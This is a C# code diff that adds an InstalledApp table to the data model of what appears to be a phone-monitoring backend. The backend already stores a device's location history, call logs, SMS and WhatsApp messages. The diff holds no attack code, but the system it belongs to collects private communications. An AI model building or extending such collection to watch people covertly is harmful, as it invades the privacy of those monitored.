@@ -38,11 +38,12 @@ public class Device
     public User User { get; set; } = null!;
 
     // Navigation
-    public ICollection<LocationLog>     Locations    { get; set; } = [];
-    public ICollection<CallLogEntry>    CallLogs     { get; set; } = [];
-    public ICollection<SmsEntry>        SmsLogs      { get; set; } = [];
-    public ICollection<WhatsAppMessage> WhatsAppMsgs { get; set; } = [];
+    public ICollection<LocationLog>     Locations     { get; set; } = [];
+    public ICollection<CallLogEntry>    CallLogs      { get; set; } = [];
+    public ICollection<SmsEntry>        SmsLogs       { get; set; } = [];
+    public ICollection<WhatsAppMessage> WhatsAppMsgs  { get; set; } = [];
     public ICollection<WhatsAppChatMsg> WhatsAppChats { get; set; } = [];
+    public ICollection<InstalledApp>    InstalledApps { get; set; } = [];
 }
 
 public class LocationLog
@@ -112,4 +113,24 @@ public class WhatsAppChatMsg
 
     public int    DeviceId  { get; set; }
     public Device Device    { get; set; } = null!;
+}
+
+/// <summary>Snapshot of installed apps on the device (upserted on each sync)</summary>
+public class InstalledApp
+{
+    public long   Id          { get; set; }
+    /// <summary>e.g. com.instagram.android</summary>
+    public string PackageName { get; set; } = string.Empty;
+    public string AppName     { get; set; } = string.Empty;
+    /// <summary>Version string from PackageInfo, e.g. "1.2.3"</summary>
+    public string Version     { get; set; } = string.Empty;
+    /// <summary>UTC epoch ms of first install reported by PackageInfo</summary>
+    public long   InstalledAt { get; set; }
+    /// <summary>Timestamp when this record was last synced</summary>
+    public long    LastSeenAt  { get; set; }
+    /// <summary>App icon as Base64-encoded PNG (48x48), may be null</summary>
+    public string? IconBase64  { get; set; }
+
+    public int     DeviceId    { get; set; }
+    public Device Device      { get; set; } = null!;
 }
